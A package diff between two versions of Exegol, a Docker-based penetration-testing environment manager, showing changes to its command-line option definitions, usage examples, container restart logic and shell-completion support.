             "Create a container [blue]test[/blue] with a custom shared workspace": "exegol start [blue]test[/blue] [bright_blue]full[/bright_blue] -w [magenta]./project/pentest/[/magenta]",
             "Create a container [blue]test[/blue] sharing the current working directory": "exegol start [blue]test[/blue] [bright_blue]full[/bright_blue] -cwd",
             "Create a container [blue]htb[/blue] with a VPN": "exegol start [blue]htb[/blue] [bright_blue]full[/bright_blue] --vpn [magenta]~/vpn/[/magenta][bright_magenta]lab_Dramelac.ovpn[/bright_magenta]",
             "Create a container [blue]app[/blue] with custom volume": "exegol start [blue]app[/blue] [bright_blue]full[/bright_blue] -V [bright_magenta]'/var/app/:/app/'[/bright_magenta]",
             "Get a [blue]tmux[/blue] shell": "exegol start --shell [blue]tmux[/blue]",
-            "Use a Proxmark": "exegol start -d /dev/ttyACM0",
-            "Use an HackRF One": "exegol start -d /dev/bus/usb/",
+            "Share a specific [blue]hardware device[/blue] (like Proxmark)": "exegol start -d /dev/ttyACM0",
+            "Share every [blue]USB device[/blue] connected to the host": "exegol start -d /dev/bus/usb/",
         }
 
-        # Create container start / exec arguments
-        self.shell = Option("-s", "--shell",
-                            dest="shell",
-                            action="store",
-                            choices=UserConfig.start_shell_options,
-                            default=UserConfig().default_start_shell,
-                            help=f"Select a shell environment to launch at startup (Default: [blue]{UserConfig().default_start_shell}[/blue])")
-
-        self.log = Option("-l", "--log",
-                          dest="log",
-                          action="store_true",
-                          default=False,
-                          help="Enable shell logging (commands and outputs) on exegol to /workspace/logs/ (default: [red]Disabled[/red])")
-        self.log_method = Option("--log-method",
-                                 dest="log_method",
-                                 action="store",
-                                 choices=UserConfig.shell_logging_method_options,
-                                 default=UserConfig().shell_logging_method,
-                                 help=f"Select a shell logging method used to record the session (default: [blue]{UserConfig().shell_logging_method}[/blue])")
-        self.log_compress = Option("--log-compress",
-                                   dest="log_compress",
-                                   action="store_true",
-                                   default=False,
-                                   help=f"Enable or disable the automatic compression of log files at the end of the session (default: {'[green]Enabled[/green]' if UserConfig().shell_logging_compress else '[red]Disabled[/red]'})")
-
-        self.groupArgs.append(GroupArg({"arg": self.log, "required": False},
-                                       {"arg": self.log_method, "required": False},
-                                       {"arg": self.log_compress, "required": False},
-                                       title="[blue]Container creation Shell logging options[/blue]"))
-
-        ContainerStart.__init__(self, self.groupArgs)
-
-        # Create group parameter for container selection
-        self.groupArgs.append(GroupArg({"arg": self.shell, "required": False},
-                                       title="[bold cyan]Start[/bold cyan] [blue]specific options[/blue]"))
-
     def __call__(self, *args, **kwargs):
         return ExegolManager.start
 
 
 class Stop(Command, ContainerMultiSelector):
     """Stop an Exegol container"""
 
@@ -78,46 +44,65 @@
         }
 
     def __call__(self, *args, **kwargs):
         logger.debug("Running stop module")
         return ExegolManager.stop
 
 
-class Install(Command, ImageSelector):
-    """Install or build Exegol image"""
+class Restart(Command, ContainerSelector, ContainerSpawnShell):
+    """Restart an Exegol container"""
 
     def __init__(self):
         Command.__init__(self)
-        ImageSelector.__init__(self, self.groupArgs)
+        ContainerSelector.__init__(self, self.groupArgs)
+        ContainerSpawnShell.__init__(self, self.groupArgs)
 
         self._usages = {
-            "Install or build interactively an exegol image": "exegol install",
-            "Install or update the [bright_blue]full[/bright_blue] image": "exegol install [bright_blue]full[/bright_blue]",
-            "Build interactively a local image named [blue]myimage[/blue]": "exegol install [blue]myimage[/blue]",
-            "Build the [blue]myimage[/blue] image based on the [bright_blue]full[/bright_blue] profile and log the operation": "exegol install [blue]myimage[/blue] [bright_blue]full[/bright_blue] --build-log /tmp/build.log",
+            "Restart interactively one containers": "exegol restart",
+            "Restart [blue]demo[/blue]": "exegol restart [blue]demo[/blue]"
         }
 
+    def __call__(self, *args, **kwargs):
+        logger.debug("Running restart module")
+        return ExegolManager.restart
+
+
+class Install(Command, ImageSelector):
+    """Install or build Exegol image"""
+
+    def __init__(self):
+        Command.__init__(self)
+        ImageSelector.__init__(self, self.groupArgs)
+
         # Create container build arguments
         self.build_profile = Option("build_profile",
                                     metavar="BUILD_PROFILE",
                                     choices=UpdateManager.listBuildProfiles().keys(),
                                     nargs="?",
                                     action="store",
-                                    help="Select the build profile used to create a local image.")
+                                    help="Select the build profile used to create a local image.",
+                                    completer=BuildProfileCompleter)
         self.build_log = Option("--build-log",
                                 dest="build_log",
                                 metavar="LOGFILE_PATH",
                                 action="store",
                                 help="Write image building logs to a file.")
 
         # Create group parameter for container selection
         self.groupArgs.append(GroupArg({"arg": self.build_profile, "required": False},
                                        {"arg": self.build_log, "required": False},
                                        title="[bold cyan]Build[/bold cyan] [blue]specific options[/blue]"))
 
+        self._usages = {
+            "Install or build interactively an exegol image": "exegol install",
+            "Install or update the [bright_blue]full[/bright_blue] image": "exegol install [bright_blue]full[/bright_blue]",
+            "Build interactively a local image named [blue]myimage[/blue]": "exegol install [blue]myimage[/blue]",
+            "Build the [blue]myimage[/blue] image based on the [bright_blue]full[/bright_blue] profile and log the operation": "exegol install [blue]myimage[/blue] [bright_blue]full[/bright_blue] --build-log /tmp/build.log",
+        }
+
     def __call__(self, *args, **kwargs):
         logger.debug("Running install module")
         return ExegolManager.install
 
 
 class Update(Command, ImageSelector):
     """Update an Exegol image"""
@@ -206,29 +191,14 @@
     """Execute a command on an Exegol container"""
 
     def __init__(self):
         Command.__init__(self)
         ContainerCreation.__init__(self, self.groupArgs)
         ContainerStart.__init__(self, self.groupArgs)
 
-        self._usages = {
-            "Execute the command [magenta]bloodhound[/magenta] in the container [blue]demo[/blue]":
-                "exegol exec [blue]demo[/blue] [magenta]bloodhound[/magenta]",
-            "Execute the command [magenta]'nmap -h'[/magenta] with console output":
-                "exegol exec -v [blue]demo[/blue] [magenta]'nmap -h'[/magenta]",
-            "Execute a command in [green]background[/green] within the [blue]demo[/blue] container":
-                "exegol exec [green]-b[/green] [blue]demo[/blue] [magenta]bloodhound[/magenta]",
-            "Execute the command [magenta]bloodhound[/magenta] in a temporary container based on the [bright_blue]full[/bright_blue] image":
-                "exegol exec --tmp [bright_blue]full[/bright_blue] [magenta]bloodhound[/magenta]",
-            "Execute a command in [green]background[/green] with a temporary container":
-                "exegol exec [green]-b[/green] --tmp [bright_blue]full[/bright_blue] [magenta]bloodhound[/magenta]",
-            "Execute the command [magenta]wireshark[/magenta] with [orange3]network admin[/orange3] privileged":
-                "exegol exec [green]-b[/green] --tmp --cap [orange3]NET_ADMIN[/orange3] [bright_blue]full[/bright_blue] [magenta]wireshark[/magenta]",
-        }
-
         # Overwrite default selectors
         for group in self.groupArgs.copy():
             # Find group containing default selector to remove them
             for parameter in group.options:
                 if parameter.get('arg') == self.containertag or parameter.get('arg') == self.imagetag:
                     # Removing default GroupArg selector
                     self.groupArgs.remove(group)
@@ -237,22 +207,24 @@
         self.containertag = None
         self.imagetag = None
 
         self.selector = Option("selector",
                                metavar="CONTAINER or IMAGE",
                                nargs='?',
                                action="store",
-                               help="Tag used to target an Exegol container (by default) or an image (if --tmp is set).")
+                               help="Tag used to target an Exegol container (by default) or an image (if --tmp is set).",
+                               completer=HybridContainerImageCompleter)
 
         # Custom parameters
         self.exec = Option("exec",
                            metavar="COMMAND",
                            nargs="+",
                            action="store",
-                           help="Execute a single command in the exegol container.")
+                           help="Execute a single command in the exegol container.",
+                           completer=VoidCompleter)
         self.daemon = Option("-b", "--background",
                              action="store_true",
                              dest="daemon",
                              help="Executes the command in background as a daemon "
                                   "(default: [red not italic]False[/red not italic])")
         self.tmp = Option("--tmp",
                           action="store_true",
@@ -263,14 +235,29 @@
         # Create group parameter for container selection
         self.groupArgs.append(GroupArg({"arg": self.selector, "required": False},
                                        {"arg": self.exec, "required": False},
                                        {"arg": self.daemon, "required": False},
                                        {"arg": self.tmp, "required": False},
                                        title="[bold cyan]Exec[/bold cyan] [blue]specific options[/blue]"))
 
+        self._usages = {
+            "Execute the command [magenta]bloodhound[/magenta] in the container [blue]demo[/blue]":
+                "exegol exec [blue]demo[/blue] [magenta]bloodhound[/magenta]",
+            "Execute the command [magenta]'nmap -h'[/magenta] with console output":
+                "exegol exec -v [blue]demo[/blue] [magenta]'nmap -h'[/magenta]",
+            "Execute a command in [green]background[/green] within the [blue]demo[/blue] container":
+                "exegol exec [green]-b[/green] [blue]demo[/blue] [magenta]bloodhound[/magenta]",
+            "Execute the command [magenta]bloodhound[/magenta] in a temporary container based on the [bright_blue]full[/bright_blue] image":
+                "exegol exec --tmp [bright_blue]full[/bright_blue] [magenta]bloodhound[/magenta]",
+            "Execute a command in [green]background[/green] with a temporary container":
+                "exegol exec [green]-b[/green] --tmp [bright_blue]full[/bright_blue] [magenta]bloodhound[/magenta]",
+            "Execute the command [magenta]wireshark[/magenta] with [orange3]network admin[/orange3] privileged":
+                "exegol exec [green]-b[/green] --tmp --cap [orange3]NET_ADMIN[/orange3] [bright_blue]full[/bright_blue] [magenta]wireshark[/magenta]",
+        }
+
     def __call__(self, *args, **kwargs):
         logger.debug("Running exec module")
         return ExegolManager.exec
 
 
 class Info(Command, ContainerSelector):
     """Show info on containers and images (local & remote)"""
```

### Comparing `Exegol-4.1.1/exegol/console/cli/actions/GenericParameters.py` & `Exegol-4.2.0/exegol/console/cli/actions/GenericParameters.py`

 * *Files 25% similar despite different names*

```diff
@@ -1,23 +1,27 @@
-from typing import List
+from typing import List, Optional
 
+from argcomplete.completers import EnvironCompleter, DirectoriesCompleter, FilesCompleter
+
+from exegol.config.UserConfig import UserConfig
+from exegol.console.cli.ExegolCompleter import ContainerCompleter, ImageCompleter, VoidCompleter
 from exegol.console.cli.actions.Command import Option, GroupArg
-from exegol.utils.UserConfig import UserConfig
 
 
 class ContainerSelector:
     """Generic parameter class for container selection"""
 
     def __init__(self, groupArgs: List[GroupArg]):
         # Create container selector arguments
-        self.containertag = Option("containertag",
-                                   metavar="CONTAINER",
-                                   nargs='?',
-                                   action="store",
-                                   help="Tag used to target an Exegol container")
+        self.containertag: Optional[Option] = Option("containertag",
+                                                     metavar="CONTAINER",
+                                                     nargs='?',
+                                                     action="store",
+                                                     help="Tag used to target an Exegol container",
+                                                     completer=ContainerCompleter)
 
         # Create group parameter for container selection
         groupArgs.append(GroupArg({"arg": self.containertag, "required": False},
                                   title="[blue]Container selection options[/blue]"))
 
 
 class ContainerMultiSelector:
@@ -25,50 +29,96 @@
 
     def __init__(self, groupArgs: List[GroupArg]):
         # Create container selector arguments
         self.multicontainertag = Option("multicontainertag",
                                         metavar="CONTAINER",
                                         nargs='*',
                                         action="store",
-                                        help="Tag used to target one or more Exegol containers")
+                                        help="Tag used to target one or more Exegol containers",
+                                        completer=ContainerCompleter)
 
         # Create group parameter for container multi selection
         groupArgs.append(GroupArg({"arg": self.multicontainertag, "required": False},
                                   title="[blue]Containers selection options[/blue]"))
 
 
 class ContainerStart:
     """Generic parameter class for container selection.
-    This generic class is used by start and exec actions"""
+    This generic class is used by start, restart and exec actions"""
 
     def __init__(self, groupArgs: List[GroupArg]):
         # Create options on container start
         self.envs = Option("-e", "--env",
                            action="append",
                            default=[],
                            dest="envs",
                            help="And an environment variable on Exegol (format: --env KEY=value). The variables "
                                 "configured during the creation of the container will be persistent in all shells. "
-                                "If the container already exists, the variable will be present only in the current shell")
+                                "If the container already exists, the variable will be present only in the current shell",
+                           completer=EnvironCompleter)
 
         # Create group parameter for container options at start
         groupArgs.append(GroupArg({"arg": self.envs, "required": False},
                                   title="[blue]Container start options[/blue]"))
 
 
+class ContainerSpawnShell(ContainerStart):
+    """Generic parameter class to spawn a shell on an exegol container.
+    This generic class is used by start and restart"""
+
+    def __init__(self, groupArgs: List[GroupArg]):
+        # Spawn container shell arguments
+        self.shell = Option("-s", "--shell",
+                            dest="shell",
+                            action="store",
+                            choices=UserConfig.start_shell_options,
+                            default=UserConfig().default_start_shell,
+                            help=f"Select a shell environment to launch at startup (Default: [blue]{UserConfig().default_start_shell}[/blue])")
+
+        self.log = Option("-l", "--log",
+                          dest="log",
+                          action="store_true",
+                          default=False,
+                          help="Enable shell logging (commands and outputs) on exegol to /workspace/logs/ (default: [red]Disabled[/red])")
+        self.log_method = Option("--log-method",
+                                 dest="log_method",
+                                 action="store",
+                                 choices=UserConfig.shell_logging_method_options,
+                                 default=UserConfig().shell_logging_method,
+                                 help=f"Select a shell logging method used to record the session (default: [blue]{UserConfig().shell_logging_method}[/blue])")
+        self.log_compress = Option("--log-compress",
+                                   dest="log_compress",
+                                   action="store_true",
+                                   default=False,
+                                   help=f"Enable or disable the automatic compression of log files at the end of the session (default: {'[green]Enabled[/green]' if UserConfig().shell_logging_compress else '[red]Disabled[/red]'})")
+
+        # Group dedicated to shell logging feature
+        groupArgs.append(GroupArg({"arg": self.log, "required": False},
+                                  {"arg": self.log_method, "required": False},
+                                  {"arg": self.log_compress, "required": False},
+                                  title="[blue]Container creation Shell logging options[/blue]"))
+
+        ContainerStart.__init__(self, groupArgs)
+
+        # Create group parameter for container selection
+        groupArgs.append(GroupArg({"arg": self.shell, "required": False},
+                                  title="[bold cyan]Start[/bold cyan] [blue]specific options[/blue]"))
+
+
 class ImageSelector:
     """Generic parameter class for image selection"""
 
     def __init__(self, groupArgs: List[GroupArg]):
         # Create image selector arguments
-        self.imagetag = Option("imagetag",
-                               metavar="IMAGE",
-                               nargs='?',
-                               action="store",
-                               help="Tag used to target an Exegol image")
+        self.imagetag: Optional[Option] = Option("imagetag",
+                                                 metavar="IMAGE",
+                                                 nargs='?',
+                                                 action="store",
+                                                 help="Tag used to target an Exegol image",
+                                                 completer=ImageCompleter)
 
         # Create group parameter for image selection
         groupArgs.append(GroupArg({"arg": self.imagetag, "required": False},
                                   title="[blue]Image selection options[/blue]"))
 
 
 class ImageMultiSelector:
@@ -76,15 +126,16 @@
 
     def __init__(self, groupArgs: List[GroupArg]):
         # Create image multi selector arguments
         self.multiimagetag = Option("multiimagetag",
                                     metavar="IMAGE",
                                     nargs='*',
                                     action="store",
-                                    help="Tag used to target one or more Exegol images")
+                                    help="Tag used to target one or more Exegol images",
+                                    completer=ImageCompleter)
 
         # Create group parameter for image multi selection
         groupArgs.append(GroupArg({"arg": self.multiimagetag, "required": False},
                                   title="[blue]Images selection options[/blue]"))
 
 
 class ContainerCreation(ContainerSelector, ImageSelector):
@@ -97,18 +148,18 @@
 
         self.X11 = Option("--disable-X11",
                           action="store_false",
                           default=True,
                           dest="X11",
                           help="Disable display sharing to run GUI-based applications (default: [green]Enabled[/green])")
         self.my_resources = Option("--disable-my-resources",
-                                       action="store_false",
-                                       default=True,
-                                       dest="my_resources",
-                                       help=f"Disable the mount of the my-resources (/opt/my-resources) from the host ({UserConfig().my_resources_path}) (default: [green]Enabled[/green])")
+                                   action="store_false",
+                                   default=True,
+                                   dest="my_resources",
+                                   help=f"Disable the mount of the my-resources (/opt/my-resources) from the host ({UserConfig().my_resources_path}) (default: [green]Enabled[/green])")
         self.exegol_resources = Option("--disable-exegol-resources",
                                        action="store_false",
                                        default=True,
                                        dest="exegol_resources",
                                        help=f"Disable the mount of the exegol resources (/opt/resources) from the host ({UserConfig().exegol_resources_path}) (default: [green]Enabled[/green])")
         self.host_network = Option("--disable-shared-network",
                                    action="store_false",
@@ -124,15 +175,16 @@
                                         dest="mount_current_dir",
                                         action="store_true",
                                         default=False,
                                         help="This option is a shortcut to set the /workspace folder to the user's current working directory")
         self.workspace_path = Option("-w", "--workspace",
                                      dest="workspace_path",
                                      action="store",
-                                     help="The specified host folder will be linked to the /workspace folder in the container")
+                                     help="The specified host folder will be linked to the /workspace folder in the container",
+                                     completer=DirectoriesCompleter())
         self.update_fs_perms = Option("-fs", "--update-fs",
                                       action="store_true",
                                       default=False,
                                       dest="update_fs_perms",
                                       help=f"Modifies the permissions of folders and sub-folders shared in your workspace to access the files created within the container using your host user account. "
                                            f"(default: {'[green]Enabled[/green]' if UserConfig().auto_update_workspace_fs else '[red]Disabled[/red]'})")
         self.volumes = Option("-V", "--volume",
@@ -140,21 +192,29 @@
                               default=[],
                               dest="volumes",
                               help="Share a new volume between host and exegol (format: --volume /path/on/host/:/path/in/container/)")
         self.ports = Option("-p", "--port",
                             action="append",
                             default=[],
                             dest="ports",
-                            help="Share a network port between host and exegol (format: --port [<host_ipv4>:]<host_port>[:<container_port>][:<protocol>]. This configuration will disable the shared network with the host.")
+                            help="Share a network port between host and exegol (format: --port [<host_ipv4>:]<host_port>[:<container_port>][:<protocol>]. This configuration will disable the shared network with the host.",
+                            completer=VoidCompleter)
+        self.hostname = Option("--hostname",
+                               dest="hostname",
+                               default=None,
+                               action="store",
+                               help="Set a custom hostname to the exegol container (default: exegol-<name>)",
+                               completer=VoidCompleter)
         self.capabilities = Option("--cap",
                                    dest="capabilities",
-                                   metavar='',  # Do not display available choices
+                                   metavar='CAP',  # Do not display available choices
                                    action="append",
                                    default=[],
-                                   choices={"NET_RAW", "MKNOD", "SETFCAP", "SYS_CHROOT", "NET_ADMIN", "NET_BROADCAST", "SYS_MODULE", "SYS_PTRACE", "SYS_ADMIN", "SYS_RAWIO"},
+                                   choices={"NET_ADMIN", "NET_BROADCAST", "SYS_MODULE", "SYS_PTRACE", "SYS_RAWIO",
+                                            "SYS_ADMIN", "LINUX_IMMUTABLE", "MAC_ADMIN", "SYSLOG"},
                                    help="[orange3](dangerous)[/orange3] Capabilities allow to add [orange3]specific[/orange3] privileges to the container "
                                         "(e.g. need to mount volumes, perform low-level operations on the network, etc).")
         self.privileged = Option("--privileged",
                                  dest="privileged",
                                  action="store_true",
                                  default=False,
                                  help="[orange3](dangerous)[/orange3] Give [red]ALL[/red] admin privileges to the container when it is created "
@@ -165,32 +225,41 @@
                               action="append",
                               help="Add host [default not bold]device(s)[/default not bold] at the container creation (example: -d /dev/ttyACM0 -d /dev/bus/usb/)")
 
         self.vpn = Option("--vpn",
                           dest="vpn",
                           default=None,
                           action="store",
-                          help="Setup an OpenVPN connection at the container creation (example: --vpn /home/user/vpn/conf.ovpn)")
+                          help="Setup an OpenVPN connection at the container creation (example: --vpn /home/user/vpn/conf.ovpn)",
+                          completer=FilesCompleter(["ovpn"], directories=True))
         self.vpn_auth = Option("--vpn-auth",
                                dest="vpn_auth",
                                default=None,
                                action="store",
                                help="Enter the credentials with a file (first line: username, second line: password) to establish the VPN connection automatically (example: --vpn-auth /home/user/vpn/auth.txt)")
 
+        self.comment = Option("--comment",
+                              dest="comment",
+                              action="store",
+                              help="The specified comment will be added to the container info",
+                              completer=VoidCompleter)
+
         groupArgs.append(GroupArg({"arg": self.workspace_path, "required": False},
                                   {"arg": self.mount_current_dir, "required": False},
                                   {"arg": self.update_fs_perms, "required": False},
                                   {"arg": self.volumes, "required": False},
                                   {"arg": self.ports, "required": False},
+                                  {"arg": self.hostname, "required": False},
                                   {"arg": self.capabilities, "required": False},
                                   {"arg": self.privileged, "required": False},
                                   {"arg": self.devices, "required": False},
                                   {"arg": self.X11, "required": False},
                                   {"arg": self.my_resources, "required": False},
                                   {"arg": self.exegol_resources, "required": False},
                                   {"arg": self.host_network, "required": False},
                                   {"arg": self.share_timezone, "required": False},
+                                  {"arg": self.comment, "required": False},
                                   title="[blue]Container creation options[/blue]"))
 
         groupArgs.append(GroupArg({"arg": self.vpn, "required": False},
                                   {"arg": self.vpn_auth, "required": False},
                                   title="[blue]Container creation VPN options[/blue]"))
```

### Comparing `Exegol-4.1.1/exegol/manager/ExegolController.py` & `Exegol-4.2.0/exegol/manager/ExegolController.py`

 * *Files 2% similar despite different names*

```diff
@@ -2,15 +2,15 @@
     from git.exc import GitCommandError
 
     from exegol.console.cli.ParametersManager import ParametersManager
     from exegol.console.cli.actions.ExegolParameters import Command
     from exegol.utils.ExeLog import logger, ExeLog, console
 except ModuleNotFoundError as e:
     print("Mandatory dependencies are missing:", e)
-    print("Please install them with pip3 install -r requirements.txt")
+    print("Please install them with python3 -m pip install --upgrade -r requirements.txt")
     exit(1)
 except ImportError as e:
     print("An error occurred while loading the dependencies!")
     print()
     if "git executable" in e.msg:
         print("Git is missing in your PATH, it must be installed locally on your computer.")
         print()
```

### Comparing `Exegol-4.1.1/exegol/manager/ExegolManager.py` & `Exegol-4.2.0/exegol/manager/ExegolManager.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,31 +1,31 @@
 import binascii
 import logging
 import os
 from typing import Union, List, Tuple, Optional, cast, Sequence
 
+from exegol.config.ConstantConfig import ConstantConfig
+from exegol.config.EnvInfo import EnvInfo
+from exegol.config.UserConfig import UserConfig
 from exegol.console import ConsoleFormat
 from exegol.console.ConsoleFormat import boolFormatter
 from exegol.console.ExegolPrompt import Confirm
 from exegol.console.TUI import ExegolTUI
 from exegol.console.cli.ParametersManager import ParametersManager
 from exegol.console.cli.actions.GenericParameters import ContainerCreation
 from exegol.exceptions.ExegolExceptions import ObjectNotFound, CancelOperation
 from exegol.manager.UpdateManager import UpdateManager
 from exegol.model.ContainerConfig import ContainerConfig
 from exegol.model.ExegolContainer import ExegolContainer
 from exegol.model.ExegolContainerTemplate import ExegolContainerTemplate
 from exegol.model.ExegolImage import ExegolImage
 from exegol.model.ExegolModules import ExegolModules
 from exegol.model.SelectableInterface import SelectableInterface
-from exegol.utils.ConstantConfig import ConstantConfig
 from exegol.utils.DockerUtils import DockerUtils
-from exegol.utils.EnvInfo import EnvInfo
-from exegol.utils.ExeLog import logger, ExeLog
-from exegol.utils.UserConfig import UserConfig
+from exegol.utils.ExeLog import logger, ExeLog, console
 
 
 class ExegolManager:
     """Contains the main procedures of all actions available in Exegol"""
 
     # Cache data
     __container: Union[Optional[ExegolContainer], List[ExegolContainer]] = None
@@ -44,14 +44,15 @@
         if logger.isEnabledFor(ExeLog.ADVANCED):
             logger.verbose("Listing git repositories")
             ExegolTUI.printTable(UpdateManager.listGitStatus(), title="[not italic]:octopus: [/not italic][gold3][g]Project modules[/g][/gold3]")
         if bool(ParametersManager().containertag):
             # If the user have supplied a container name, show container config
             container = cls.__loadOrCreateContainer(ParametersManager().containertag, must_exist=True)
             if container is not None:
+                assert type(container) is ExegolContainer
                 ExegolTUI.printContainerRecap(container)
         else:
             # Without any parameter, show all images and containers info
             # Fetch data
             images = DockerUtils.listImages(include_version_tag=False)
             containers = DockerUtils.listContainers()
             # List and print images
@@ -70,14 +71,15 @@
         ExegolManager.print_version()
         logger.info("Starting exegol")
         # Check if the first positional parameter have been supplied
         cls.__interactive_mode = not bool(ParametersManager().containertag)
         if not cls.__interactive_mode:
             logger.info("Arguments supplied with the command, skipping interactive mode")
         container = cls.__loadOrCreateContainer()
+        assert container is not None and type(container) is ExegolContainer
         if not container.isNew():
             # Check and warn user if some parameters don't apply to the current session
             cls.__checkUselessParameters()
         container.start()
         container.spawnShell()
 
     @classmethod
@@ -91,27 +93,39 @@
             if not ParametersManager().daemon:
                 container.exec(command=ParametersManager().exec, as_daemon=False, is_tmp=True)
                 container.stop(timeout=2)
             else:
                 # Command is passed at container creation in __createTmpContainer()
                 logger.success(f"Command executed as entrypoint of the container [green]'{container.hostname}'[/green]")
         else:
-            container = cls.__loadOrCreateContainer(override_container=ParametersManager().selector)
+            container = cast(ExegolContainer, cls.__loadOrCreateContainer(override_container=ParametersManager().selector))
             container.exec(command=ParametersManager().exec, as_daemon=ParametersManager().daemon)
 
     @classmethod
     def stop(cls):
         """Stop an exegol container"""
         ExegolManager.print_version()
         logger.info("Stopping exegol")
         container = cls.__loadOrCreateContainer(multiple=True, must_exist=True)
+        assert container is not None and type(container) is list
         for c in container:
             c.stop(timeout=2)
 
     @classmethod
+    def restart(cls):
+        """Stop and start an exegol container"""
+        ExegolManager.print_version()
+        container = cast(ExegolContainer, cls.__loadOrCreateContainer(must_exist=True))
+        if container:
+            container.stop(timeout=5)
+            container.start()
+            logger.success(f"Container [green]{container.name}[/green] successfully restarted!")
+            container.spawnShell()
+
+    @classmethod
     def install(cls):
         """Pull or build a docker exegol image"""
         ExegolManager.print_version()
         try:
             if not ExegolModules().isExegolResourcesReady():
                 raise CancelOperation
         except CancelOperation:
@@ -137,14 +151,15 @@
         """Remove an exegol image"""
         ExegolManager.print_version()
         logger.info("Uninstalling an exegol image")
         # Set log level to verbose in order to show every image installed including the outdated.
         if not logger.isEnabledFor(ExeLog.VERBOSE):
             logger.setLevel(ExeLog.VERBOSE)
         images = cls.__loadOrInstallImage(multiple=True, must_exist=True)
+        assert type(images) is list
         if len(images) == 0:
             return
         all_name = ", ".join([x.getName() for x in images])
         if not ParametersManager().force_mode and not Confirm(
                 f"Are you sure you want to [red]permanently remove[/red] the following images? [orange3][ {all_name} ][/orange3]",
                 default=False):
             logger.error("Aborting operation.")
@@ -154,14 +169,15 @@
 
     @classmethod
     def remove(cls):
         """Remove an exegol container"""
         ExegolManager.print_version()
         logger.info("Removing an exegol container")
         containers = cls.__loadOrCreateContainer(multiple=True, must_exist=True)
+        assert type(containers) is list
         if len(containers) == 0:
             logger.error("No containers were selected. Exiting.")
             return
         all_name = ", ".join([x.name for x in containers])
         if not ParametersManager().force_mode and not Confirm(
                 f"Are you sure you want to [red]permanently remove[/red] the following containers? [orange3][ {all_name} ][/orange3]",
                 default=False):
@@ -172,15 +188,16 @@
             # If the image used is deprecated, it must be deleted after the removal of its container
             if c.image.isLocked() and UserConfig().auto_remove_images:
                 DockerUtils.removeImage(c.image, upgrade_mode=True)
 
     @classmethod
     def print_version(cls):
         """Show exegol version (and context configuration on debug mode)"""
-        logger.raw(f"[bold blue][*][/bold blue] Exegol is currently in version [blue]v{ConstantConfig.version}[/blue]{os.linesep}",
+
+        logger.raw(f"[bold blue][*][/bold blue] Exegol is currently in version {UpdateManager.display_current_version()}{os.linesep}",
                    level=logging.INFO, markup=True)
         logger.raw(
             f"[bold magenta][*][/bold magenta] Exegol Discord serv.: [underline magenta]{ConstantConfig.discord}[/underline magenta]{os.linesep}",
             level=logging.INFO, markup=True)
         logger.raw(
             f"[bold magenta][*][/bold magenta] Exegol documentation: [underline magenta]{ConstantConfig.documentation}[/underline magenta]{os.linesep}",
             level=logging.INFO, markup=True)
@@ -191,15 +208,15 @@
             logger.warning("You are currently using an [red]Alpha[/red] version of Exegol, which may be unstable. "
                            "This version is a work in progress and bugs are expected.")
         elif 'b' in ConstantConfig.version:
             logger.empty_line()
             logger.warning("You are currently using a [orange3]Beta[/orange3] version of Exegol, which may be unstable.")
         logger.debug(f"Pip installation: {boolFormatter(ConstantConfig.pip_installed)}")
         logger.debug(f"Git source installation: {boolFormatter(ConstantConfig.git_source_installation)}")
-        logger.debug(f"Host OS: {EnvInfo.getHostOs()}")
+        logger.debug(f"Host OS: {EnvInfo.getHostOs()} [bright_black]({EnvInfo.getDockerEngine()})[/bright_black]")
         logger.debug(f"Arch: {EnvInfo.arch}")
         if EnvInfo.arch != EnvInfo.raw_arch:
             logger.debug(f"Raw arch: {EnvInfo.raw_arch}")
         if EnvInfo.isWindowsHost():
             logger.debug(f"Windows release: {EnvInfo.getWindowsRelease()}")
             logger.debug(f"Python environment: {EnvInfo.current_platform}")
             logger.debug(f"Docker engine: {EnvInfo.getDockerEngine().upper()}")
@@ -213,17 +230,19 @@
                 UpdateManager.updateWrapper()
         else:
             logger.empty_line(log_level=logging.DEBUG)
 
     @classmethod
     def print_sponsors(cls):
         """Show exegol sponsors"""
-        logger.success("""We thank [link=https://www.capgemini.com/fr-fr/carrieres/offres-emploi/][blue]Capgemini[/blue][/link] for supporting the project [bright_black](helping with dev)[/bright_black] :pray:""")
+        logger.success(
+            """We thank [link=https://www.capgemini.com/fr-fr/carrieres/offres-emploi/][blue]Capgemini[/blue][/link] for supporting the project [bright_black](helping with dev)[/bright_black] :pray:""")
         logger.success("""We thank [link=https://www.hackthebox.com/][green]HackTheBox[/green][/link] for sponsoring the [bright_black]multi-arch[/bright_black] support :green_heart:""")
 
+
     @classmethod
     def __loadOrInstallImage(cls,
                              override_image: Optional[str] = None,
                              multiple: bool = False,
                              must_exist: bool = False) -> Union[Optional[ExegolImage], List[ExegolImage]]:
         """Select / Load (and install) an ExegolImage
         When must_exist is set to True, return None if no image are installed
@@ -264,19 +283,21 @@
             except IndexError:
                 # IndexError is raised when no image are available (not applicable when multiple is set, return an empty array)
                 # (raised from TUI interactive selection)
                 if must_exist:
                     # If there is no image installed, return none
                     logger.error("Nothing to do.")
                     return [] if multiple else None
-                else:
+                elif image_tag is not None:
                     # If the user's selected image have not been found, offer the choice to build a local image at this name
                     # (only if must_exist is not set)
                     image_selection = UpdateManager.updateImage(image_tag)
                     image_tag = None
+                else:
+                    logger.critical("No image are installed or available, check your internet connection and install an image with the command [green]exegol install[/green].")
             # Checks if an image has been selected
             if image_selection is None:
                 # If not, retry the selection
                 logger.error("No image has been selected.")
                 continue
 
             # Check if every image are installed
@@ -459,25 +480,27 @@
             for device in ParametersManager().devices:
                 config.addUserDevice(device)
         if ParametersManager().vpn is not None:
             config.enableVPN()
         if ParametersManager().envs is not None:
             for env in ParametersManager().envs:
                 config.addRawEnv(env)
+        if ParametersManager().comment:
+            config.addComment(ParametersManager().comment)
         return config
 
     @classmethod
     def __createContainer(cls, name: Optional[str]) -> ExegolContainer:
         """Create an ExegolContainer"""
         logger.verbose("Configuring new exegol container")
         # Create exegol config
         image: Optional[ExegolImage] = cast(ExegolImage, cls.__loadOrInstallImage())
         config = cls.__prepareContainerConfig()
         assert image is not None  # load or install return an image
-        model = ExegolContainerTemplate(name, config, image)
+        model = ExegolContainerTemplate(name, config, image, hostname=ParametersManager().hostname)
 
         # Recap
         ExegolTUI.printContainerRecap(model)
         if cls.__interactive_mode:
             if not model.image.isUpToDate() and \
                     Confirm("Do you want to [green]update[/green] the selected image?", False):
                 image = UpdateManager.updateImage(model.image.getName())
@@ -511,15 +534,15 @@
             config.setContainerCommand("cmd", "zsh", "-c", exec_payload)
             config.addEnv("CMD", str_cmd)
